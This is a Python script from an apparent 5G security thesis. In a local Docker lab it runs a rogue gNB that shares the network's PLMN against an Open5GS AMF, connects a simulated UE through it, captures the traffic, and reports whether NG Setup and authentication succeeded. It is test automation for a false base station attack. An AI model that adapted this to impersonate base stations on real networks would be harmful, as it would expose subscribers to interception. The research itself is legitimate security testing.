#!/usr/bin/env python3
"""
False Base Station Attack - FGT1588.501
Thesis: On Enhancing 5G Security
Method: Rogue gNB with same PLMN connects to AMF
"""

import subprocess
import time

CAPTURE_FILE = "/home/eit42s/thesis-5g/captures/false_bs.pcap"
LOG_FILE     = "/home/eit42s/thesis-5g/logs/false_bs.log"

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def main():
    log("=" * 60)
    log("FALSE BASE STATION ATTACK - FGT1588.501")
    log("Target: AMF NG Setup Authentication")
    log("Method: Rogue gNB with same PLMN (001/01)")
    log("Rogue gNB: TAC=99, IP=10.10.0.50")
    log("=" * 60)

    # PHASE 1: Start capture
    log("\n[PHASE 1] Starting capture...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/false_bs.pcap", shell=True)
    tcpdump = subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/false_bs.pcap",
        shell=True
    )
    time.sleep(3)
    log("[*] Capture started.")

    # PHASE 2: Start Rogue gNB
    log("\n[PHASE 2] Starting Rogue gNB...")
    subprocess.run("docker rm -f ueransim-rogue-gnb 2>/dev/null", shell=True)

    subprocess.run(
        """docker run -d \
            --name ueransim-rogue-gnb \
            --network thesis-5g_5gcore \
            --ip 10.10.0.50 \
            -v /home/eit42s/thesis-5g/config/rogue-gnb.yaml:/etc/ueransim/gnb.yaml \
            ueransim-custom:3.2.7 gnb /etc/ueransim/gnb.yaml""",
        shell=True
    )
    time.sleep(15)

    gnb_logs = subprocess.run(
        "docker logs ueransim-rogue-gnb 2>&1 | tail -10",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] Rogue gNB logs:\n{gnb_logs}")

    # PHASE 3: Connect UE via Rogue gNB
    log("\n[PHASE 3] Connecting UE via Rogue gNB...")
    subprocess.run("docker rm -f ueransim-ue-rogue 2>/dev/null", shell=True)

    subprocess.run(
        """docker run -d \
            --name ueransim-ue-rogue \
            --network thesis-5g_5gcore \
            --ip 10.10.0.51 \
            --privileged \
            -v /home/eit42s/thesis-5g/config/ue-rogue.yaml:/etc/ueransim/ue.yaml \
            ueransim-custom:3.2.7 ue /etc/ueransim/ue.yaml""",
        shell=True
    )
    time.sleep(20)

    ue_logs = subprocess.run(
        "docker logs ueransim-ue-rogue 2>&1 | tail -10",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] UE-Rogue logs:\n{ue_logs}")

    # PHASE 4: Stop capture
    log("\n[PHASE 4] Stopping capture...")
    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/false_bs.pcap {CAPTURE_FILE}", shell=True)

    # Cleanup
    subprocess.run("docker rm -f ueransim-rogue-gnb ueransim-ue-rogue 2>/dev/null", shell=True)

    # PHASE 5: Analyze
    log("\n[PHASE 5] Analyzing results...")
    result = subprocess.run(
        f"tshark -r {CAPTURE_FILE} -d 'sctp.port==38412,ngap' 2>/dev/null | grep -i 'NGSetup\\|Registration\\|Auth'",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] Key packets:\n{result}")

    ng_setup = "NGSetupResponse" in result
    auth = "Authentication" in result

    with open(LOG_FILE, 'w') as f:
        f.write(result)

    log("\n" + "=" * 60)
    log("FALSE BASE STATION RESULTS")
    log(f"Rogue gNB NG Setup accepted: {'YES ✓' if ng_setup else 'NO'}")
    log(f"UE authenticated via rogue gNB: {'YES ✓' if auth else 'NO'}")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

if __name__ == "__main__":
    main()
